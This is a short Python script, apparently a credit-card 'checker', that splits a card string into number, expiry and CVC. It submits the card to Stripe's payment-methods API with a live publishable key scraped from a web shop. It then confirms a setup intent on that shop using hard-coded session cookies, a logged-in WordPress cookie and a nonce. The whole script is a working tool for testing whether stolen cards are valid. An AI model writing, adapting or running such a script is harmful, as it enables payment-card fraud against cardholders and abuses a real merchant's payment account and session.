import requests,re
def Tele(ccx):
	import requests
	ccx=ccx.strip()
	n = ccx.split("|")[0]
	mm = ccx.split("|")[1]
	yy = ccx.split("|")[2]
	cvc = ccx.split("|")[3]
	if "20" in yy:#Mo3gza
		yy = yy.split("20")[1]
	r = requests.session()
	
	headers = {
    'authority': 'api.stripe.com',
    'accept': 'application/json',
    'accept-language': 'en-US,en-GB;q=0.9,en;q=0.8',
    'content-type': 'application/x-www-form-urlencoded',
    'origin': 'https://js.stripe.com',
    'referer': 'https://js.stripe.com/',
    'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="124", "Google Chrome";v="124"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-site',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
}

	data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_year]={yy}&card[exp_month]={mm}&allow_redisplay=unspecified&billing_details[address][country]=TH&pasted_fields=number&payment_user_agent=stripe.js%2F7b2f7dbc1b%3B+stripe-js-v3%2F7b2f7dbc1b%3B+payment-element%3B+deferred-intent&referrer=https%3A%2F%2Fsissylover.com&time_on_page=93940&client_attribution_metadata[client_session_id]=c2a6a0e9-ac61-4344-b4eb-3ea62e3668cd&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=payment-element&client_attribution_metadata[merchant_integration_version]=2021&client_attribution_metadata[payment_intent_creation_flow]=deferred&client_attribution_metadata[payment_method_selection_flow]=merchant_specified&guid=a544a78e-0964-4744-a7bf-6bfa9f0ddaff8a3799&muid=861a3516-221c-4e62-887d-86581368c0cfd1ba91&sid=8593d9d8-859c-4222-ac5b-906cfb43b5188d35cb&key=pk_live_518G6HgBRoi4Zakzj7hzizB84DJGzRPWHatOPXSic41SmKx32hRXNCGhc4jKVLOT5zAcTBc8tiJxko1hW8ofjOg0r00E2xH7YBP&_stripe_version=2024-06-20'

	r1 = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)

	pm = r1.json()['id']

	cookies = {
    'PHPSESSID': 'f49fbbb0e92b7c1d4ed4bb4008027c1d',
    'sbjs_migrations': '1418474375998%3D1',
    'sbjs_current_add': 'fd%3D2025-02-27%2015%3A05%3A13%7C%7C%7Cep%3Dhttps%3A%2F%2Fsissylover.com%2Fmy-account%2Fpayment-methods%2F%7C%7C%7Crf%3D%28none%29',
    'sbjs_first_add': 'fd%3D2025-02-27%2015%3A05%3A13%7C%7C%7Cep%3Dhttps%3A%2F%2Fsissylover.com%2Fmy-account%2Fpayment-methods%2F%7C%7C%7Crf%3D%28none%29',
    'sbjs_current': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cmtke%3D%28none%29',
    'sbjs_first': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cmtke%3D%28none%29',
    'sbjs_udata': 'vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F124.0.0.0%20Safari%2F537.36',
    'mtk_src_trk': '%7B%22type%22%3A%22typein%22%2C%22url%22%3A%22(none)%22%2C%22mtke%22%3A%22(none)%22%2C%22utm_campaign%22%3A%22(none)%22%2C%22utm_source%22%3A%22(direct)%22%2C%22utm_medium%22%3A%22(none)%22%2C%22utm_content%22%3A%22(none)%22%2C%22utm_id%22%3A%22(none)%22%2C%22utm_term%22%3A%22(none)%22%2C%22session_entry%22%3A%22https%3A%2F%2Fsissylover.com%2Fmy-account%2Fpayment-methods%2F%22%2C%22session_start_time%22%3A%222025-02-27%2015%3A05%3A13%22%2C%22session_pages%22%3A%221%22%2C%22session_count%22%3A%221%22%7D',
    '_gid': 'GA1.2.1725705587.1740668714',
    '_clck': '67xa1t%7C2%7Cfts%7C0%7C1884',
    '__stripe_mid': '861a3516-221c-4e62-887d-86581368c0cfd1ba91',
    '__stripe_sid': '8593d9d8-859c-4222-ac5b-906cfb43b5188d35cb',
    'wordpress_logged_in_96b6c2e14a298a8aacd485caf4831926': 'BenniEnt%7C1741878392%7C4gH2oxhYFblelYTXITNwoiGRrj9Km2XsqcZxoavmlj9%7Cbe0329f8f1e4ee58206b39dd949ab15be28ce24552efbaab0eaae199a279d7de',
    'wp_automatewoo_visitor_96b6c2e14a298a8aacd485caf4831926': '4q1hvxuhkz7vw5hka2pr',
    'wp_automatewoo_session_started': '1',
    'sbjs_session': 'pgs%3D5%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fsissylover.com%2Fmy-account%2Fadd-payment-method%2F',
    '_ga_TJREF82VY2': 'GS1.1.1740668715.1.1.1740668800.0.0.0',
    '_ga': 'GA1.2.1412307369.1740668714',
    '_clsk': 'mtuk5e%7C1740668800872%7C4%7C1%7Cx.clarity.ms%2Fcollect',
	}

	headers = {
    'authority': 'sissylover.com',
    'accept': '*/*',
    'accept-language': 'en-US,en-GB;q=0.9,en;q=0.8',
    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
    # 'cookie': 'PHPSESSID=f49fbbb0e92b7c1d4ed4bb4008027c1d; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2025-02-27%2015%3A05%3A13%7C%7C%7Cep%3Dhttps%3A%2F%2Fsissylover.com%2Fmy-account%2Fpayment-methods%2F%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2025-02-27%2015%3A05%3A13%7C%7C%7Cep%3Dhttps%3A%2F%2Fsissylover.com%2Fmy-account%2Fpayment-methods%2F%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cmtke%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cmtke%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F124.0.0.0%20Safari%2F537.36; mtk_src_trk=%7B%22type%22%3A%22typein%22%2C%22url%22%3A%22(none)%22%2C%22mtke%22%3A%22(none)%22%2C%22utm_campaign%22%3A%22(none)%22%2C%22utm_source%22%3A%22(direct)%22%2C%22utm_medium%22%3A%22(none)%22%2C%22utm_content%22%3A%22(none)%22%2C%22utm_id%22%3A%22(none)%22%2C%22utm_term%22%3A%22(none)%22%2C%22session_entry%22%3A%22https%3A%2F%2Fsissylover.com%2Fmy-account%2Fpayment-methods%2F%22%2C%22session_start_time%22%3A%222025-02-27%2015%3A05%3A13%22%2C%22session_pages%22%3A%221%22%2C%22session_count%22%3A%221%22%7D; _gid=GA1.2.1725705587.1740668714; _clck=67xa1t%7C2%7Cfts%7C0%7C1884; __stripe_mid=861a3516-221c-4e62-887d-86581368c0cfd1ba91; __stripe_sid=8593d9d8-859c-4222-ac5b-906cfb43b5188d35cb; wordpress_logged_in_96b6c2e14a298a8aacd485caf4831926=BenniEnt%7C1741878392%7C4gH2oxhYFblelYTXITNwoiGRrj9Km2XsqcZxoavmlj9%7Cbe0329f8f1e4ee58206b39dd949ab15be28ce24552efbaab0eaae199a279d7de; wp_automatewoo_visitor_96b6c2e14a298a8aacd485caf4831926=4q1hvxuhkz7vw5hka2pr; wp_automatewoo_session_started=1; sbjs_session=pgs%3D5%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fsissylover.com%2Fmy-account%2Fadd-payment-method%2F; _ga_TJREF82VY2=GS1.1.1740668715.1.1.1740668800.0.0.0; _ga=GA1.2.1412307369.1740668714; _clsk=mtuk5e%7C1740668800872%7C4%7C1%7Cx.clarity.ms%2Fcollect',
    'origin': 'https://sissylover.com',
    'referer': 'https://sissylover.com/my-account/add-payment-method/',
    'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="124", "Google Chrome";v="124"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
    'x-requested-with': 'XMLHttpRequest',
	}

	params = {
    'wc-ajax': 'wc_stripe_create_and_confirm_setup_intent',
	}

	data = {
    'action': 'create_and_confirm_setup_intent',
    'wc-stripe-payment-method': pm,
    'wc-stripe-payment-type': 'card',
    '_ajax_nonce': '77c9b0257b',
	}

	r2 = requests.post('https://sissylover.com/', params=params, cookies=cookies, headers=headers, data=data)
	
	return (r2.json())
